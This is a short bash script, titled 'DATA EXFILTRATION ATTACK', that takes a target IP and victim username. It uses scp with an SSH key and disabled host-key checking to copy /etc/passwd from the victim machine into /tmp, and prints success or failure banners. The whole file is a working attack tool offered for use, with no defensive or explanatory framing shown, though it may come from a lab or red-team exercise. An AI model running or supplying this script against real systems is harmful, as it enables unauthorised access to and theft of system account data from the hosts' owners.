#!/usr/bin/env bash
set -euo pipefail

TARGET_IP="${1:-}"
VICTIM_USER="${2:-debian}"

echo "==========================================="
echo "DATA EXFILTRATION ATTACK"
echo "==========================================="

EXFIL_FILE="/tmp/exfil_passwd.txt"
SSH_KEY="$HOME/.ssh/my_key"

if [[ -z "$TARGET_IP" ]]; then
    echo "[ERROR] Missing target IP"
    exit 2
fi

if [[ ! -f "$SSH_KEY" ]]; then
    echo "[ERROR] SSH key not found: $SSH_KEY"
    exit 3
fi

echo "[INFO] Attempting to retrieve /etc/passwd from victim"

if scp -i "$SSH_KEY" \
    -o StrictHostKeyChecking=no \
    -o UserKnownHostsFile=/dev/null \
    -o ConnectTimeout=10 \
    ${VICTIM_USER}@${TARGET_IP}:/etc/passwd \
    $EXFIL_FILE 2>&1 | while read line
do
    echo "[EXFIL] $line"
done
then
    true
else
    echo "[FAIL] Exfiltration failed"
    echo "==========================================="
    echo "EXFILTRATION COMPLETE"
    echo "==========================================="
    exit 1
fi

if [ -f "$EXFIL_FILE" ]; then
    echo "[SUCCESS] Data exfiltrated"
    echo "[FILE SIZE] $(wc -l $EXFIL_FILE)"
else
    echo "[FAIL] Exfiltration failed"
    echo "==========================================="
    echo "EXFILTRATION COMPLETE"
    echo "==========================================="
    exit 1
fi

echo "==========================================="
echo "EXFILTRATION COMPLETE"
echo "==========================================="
